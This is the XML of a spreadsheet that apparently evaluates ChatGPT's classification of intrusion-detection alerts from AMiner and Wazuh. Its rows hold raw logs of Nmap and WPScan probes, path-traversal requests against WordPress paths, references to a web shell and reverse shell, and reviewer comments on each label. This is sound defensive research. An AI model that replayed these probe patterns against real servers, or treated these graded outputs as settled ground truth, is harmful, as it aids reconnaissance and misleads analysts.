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16in"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.9811in"/>
    </style:style>
    <style:style style:name="co4" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.4661in"/>
    </style:style>
    <style:style style:name="co5" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.0161in"/>
    </style:style>
    <style:style style:name="co6" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.1228in"/>
    </style:style>
    <style:style style:name="co7" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.361in"/>
    </style:style>
    <style:style style:name="co8" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.6402in"/>
    </style:style>
    <style:style style:name="co9" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.8929in"/>
    </style:style>
    <style:style style:name="co10" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.3937in"/>
    </style:style>
    <style:style style:name="co11" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.5681in"/>
    </style:style>
    <style:style style:name="co12" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.5654in"/>
    </style:style>
    <style:style style:name="co13" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.9756in"/>
    </style:style>
    <style:style style:name="co14" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.028in"/>
    </style:style>
    <style:style style:name="co15" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.6189in"/>
    </style:style>
    <style:style style:name="co16" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.3102in"/>
    </style:style>
    <style:style style:name="co17" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.7154in"/>
    </style:style>
    <style:style style:name="co18" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.7646in"/>
    </style:style>
    <style:style style:name="co19" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.5291in"/>
    </style:style>
    <style:style style:name="co20" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.9193in"/>
    </style:style>
    <style:style style:name="co21" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.3909in"/>
    </style:style>
    <style:style style:name="co22" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="3.3457in"/>
    </style:style>
    <style:style style:name="co23" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.7236in"/>
    </style:style>
    <style:style style:name="co24" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.5335in"/>
    </style:style>
    <style:style style:name="co25" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.0646in"/>
    </style:style>
    <style:style style:name="co26" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.7516in"/>
    </style:style>
    <style:style style:name="co27" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.7984in"/>
    </style:style>
    <style:style style:name="co28" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="3.2063in"/>
    </style:style>
    <style:style style:name="co29" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.5043in"/>
    </style:style>
    <style:style style:name="co30" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.4575in"/>
    </style:style>
    <style:style style:name="co31" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.0665in"/>
    </style:style>
    <style:style style:name="co32" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="7.7898in"/>
    </style:style>
    <style:style style:name="co33" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.5701in"/>
    </style:style>
    <style:style style:name="co39" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.0917in"/>
    </style:style>
    <style:style style:name="co40" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.1453in"/>
    </style:style>
    <style:style style:name="co41" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.0846in"/>
    </style:style>
    <style:style style:name="co42" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.8272in"/>
    </style:style>
    <style:style style:name="co43" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.1937in"/>
    </style:style>
    <style:style style:name="co44" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.5598in"/>
    </style:style>
    <style:style style:name="co45" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="3.4409in"/>
    </style:style>
    <style:style style:name="co46" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.8563in"/>
    </style:style>
    <style:style style:name="co47" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.5866in"/>
    </style:style>
    <style:style style:name="co48" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="3.4638in"/>
    </style:style>
    <style:style style:name="co49" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.9299in"/>
    </style:style>
    <style:style style:name="co50" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.3591in"/>
    </style:style>
    <style:style style:name="co51" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.322in"/>
    </style:style>
    <style:style style:name="co52" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.8228in"/>
    </style:style>
    <style:style style:name="co53" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="3.5173in"/>
    </style:style>
    <style:style style:name="co54" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.1016in"/>
    </style:style>
    <style:style style:name="co55" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.9547in"/>
    </style:style>
    <style:style style:name="co56" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.9437in"/>
    </style:style>
    <style:style style:name="co57" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.4126in"/>
    </style:style>
    <style:style style:name="co58" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="6.2409in"/>
    </style:style>
    <style:style style:name="co59" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.4201in"/>
    </style:style>
    <style:style style:name="co60" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.3508in"/>
    </style:style>
    <style:style style:name="co61" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.4689in"/>
    </style:style>
    <style:style style:name="co62" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="3.0665in"/>
    </style:style>
    <style:style style:name="co63" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.9598in"/>
    </style:style>
    <style:style style:name="co64" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.7047in"/>
    </style:style>
    <style:style style:name="co65" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.1909in"/>
    </style:style>
    <style:style style:name="co66" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.3374in"/>
    </style:style>
    <style:style style:name="co67" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.8417in"/>
    </style:style>
    <style:style style:name="co68" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.8953in"/>
    </style:style>
    <style:style style:name="co69" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.102in"/>
    </style:style>
    <style:style style:name="co70" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.8138in"/>
    </style:style>
    <style:style style:name="co71" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.211in"/>
    </style:style>
    <style:style style:name="co72" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.9201in"/>
    </style:style>
    <style:style style:name="co73" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.959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54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3252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ext-properties style:font-name="Liberation Serif" style:font-name-asian="DejaVu Sans" style:font-name-complex="Noto Sans Arabic"/>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ext-properties style:font-name="Liberation Serif" style:font-name-asian="DejaVu Sans" style:font-name-complex="Noto Sans Arabic"/>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zh" style:country-asian="CN" style:font-style-asian="normal" style:font-size-complex="10pt" style:language-complex="hi" style:country-complex="IN"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P_aminer_chatgpt_run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6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DNS tunneling,</text:p>
            <text:p>Data exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”, “dnsmasq[14460]: forwarded youtu.be to [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name DNS and high entropy in DNS domai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Credential Access,</text:p>
            <text:p>Brute Force</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=&lt;&gt;, rip=192.168.130.77, lip=192.168.128.195, session=&lt;hifuP9rVVNbAqIJN&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on successful imap login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Reconnaissance,</text:p>
            <text:p>Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “no host name found for IP address [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on reverse DNS looku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Access Denied,</text:p>
            <text:p>Brute Force or Misconfiguration</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probably based on attempted access to web server root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TLS Exploitation,</text:p>
            <text:p>Protocol Manipulation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “TLS error on connection from [IP] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and invalid TLS packet</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Port Scanning,</text:p>
            <text:p>Service Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363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text:p>
            <text:p>Web Application Scanning</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apache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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Initial Access,</text:p>
            <text:p>Web Server Attack</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Classification probably based on attempted access to web server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Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362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9" calcext:value-type="float">
            <text:p>9</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/analytics-for-w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Reconnaissance, </text:p>
            <text:p>File Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/ecobiz/thumb/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apache and attempted access to WordPress themes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Reconnaissance, </text:p>
            <text:p>WordPress scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/eCobiz/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apache and attempted access to WordPress themes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text:p>
            <text:p>File access probing</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attempted access to sensitive file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jection,</text:p>
            <text:p>Suspicious request payload</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Exploitation,</text:p>
            <text:p>File inclusion</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WordPress php scrip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Path Traversal Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~www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Directory Enumeration</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WordPress directory without directory index</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Denial, </text:p>
            <text:p>Reconnaissance</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ttempted access to sensitive file in WordPres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New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/lost+found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File Inclusion Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive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rectory Traversal Attempt,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/includes/classes/lost+found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File Enumeration,</text:p>
            <text:p>Reconnaissance</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ttempted access to sensitive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Control Bypass,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress plugin folder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Directory Traversal, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs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File Enumeration, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive file in WordPress folder (ph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Path Traversal Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found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File Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive file in WordPress folder (ph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Denied,</text:p>
            <text:p>Reconnaissance</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attempted access to WordPress themes folder and http status code 403</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Denied,</text:p>
            <text:p>Malicious File Probe</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attempted access to WordPress themes folder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Access Denied, </text:p>
            <text:p>Credential Access Attempt</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attempted access to sensitive file in WordPress theme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Reconnaissance,</text:p>
            <text:p>Suspicious Character Usage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/js/admin/@ HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters used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Denied,</text:p>
            <text:p>Server Misconfiguration Probe</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ttempted access to sensitive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Unauthorized Access Attempt</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ttempted access to sensitive file in WordPress theme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File Enumeration,</text:p>
            <text:p>Reconnaissance</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ttempted access to sensitive file in WordPress folder (ph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eb Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell Access,</text:p>
            <text:p>Command and Control</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in base64 encoded payload in wp upload path</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Shell Access,</text:p>
            <text:p>Command and Control</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in base64 encoded payload in wp upload path; base64 has not been decoded for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Anomalous HTTP Method Usage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual occurrence of apache request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source Exhaustion,</text:p>
            <text:p>System Anomaly</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unusual CPU valu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text:p>
            <text:p>DNS Tunneling</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probably based on unusual occurrence of DNS querie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Application Attack,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual occurrence of apache requests</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Remote Code Execution</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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on base64 encoding in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text:p>
            <text:p>Credential Access</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Credential Access</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 </text:p>
            <text:p>Privilege Escalation</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text:p>
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_acct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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”</text:p>
            <text:p>Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred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Persistence</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48])" office:value-type="float" office:value="95" calcext:value-type="float">
            <text:p>95</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_chatgpt_run1" table:style-name="ta1">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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Account Abuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success”</text:p>
            <text:p>Raw Data: “dovecot: imap-login: Login: user=&lt;susan.gregory&gt;, method=PLAIN, rip=192.168.128.170”, “dovecot: imap-login: Login: user=&lt;damian.jordan&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Misuse, </text:p>
            <text:p>Encrypted Channel Abuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on malformed TLS packet and prot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Protocol Misuse, </text:p>
            <text:p>Encrypted Channel Abuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protcol name TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Protocol Misuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on malformed TLS packet and protcol name TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Protocol Misuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on prot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Misuse, </text:p>
            <text:p>Encrypted Channel Abuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name and occurrence of 129 times</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Protocol Misuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name </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Anomaly, </text:p>
            <text:p>TLS Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”, firedtimes: 124</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name and occurrence of 124 times</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Anomaly, </text:p>
            <text:p>TLS Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name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Anomaly, </text:p>
            <text:p>TLS Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name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Protocol Anomaly, </text:p>
            <text:p>Suspicious SSL Communication</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name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Valid Account Usage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Login: user=&lt;damian.jordan&gt;, method=PLAI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Valid Account Usage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success”</text:p>
            <text:p>Raw Data: “dovecot: imap-login: Login: user=&lt;damian.jorda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Reconnaissance, </text:p>
            <text:p>SSH Scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan)”</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDs messag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 </text:p>
            <text:p>Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan)” </text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification</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Command and Control, </text:p>
            <text:p>Protocol Misuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA SMTP invalid reply”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name SMTP and invalid reply</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Initial Access, </text:p>
            <text:p>Directory Traversal Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache and attempted access to web root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 </text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code”</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nse.html" xlink:type="simple">https://nmap.org/book/nse.html</text:a>)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403 and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Initial Access, </text:p>
            <text:p>Web Application Scanning</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tool name apache and attempted access to web root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Reconnaissance, </text:p>
            <text:p>Plugin Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/change-wp-admin-login/ HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (<text:a xlink:href="https://wpscan.com/wordpress-security-scanner" xlink:type="simple">https://wpscan.com/wordpress-security-scanner</text:a>)”</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Reconnaissance, </text:p>
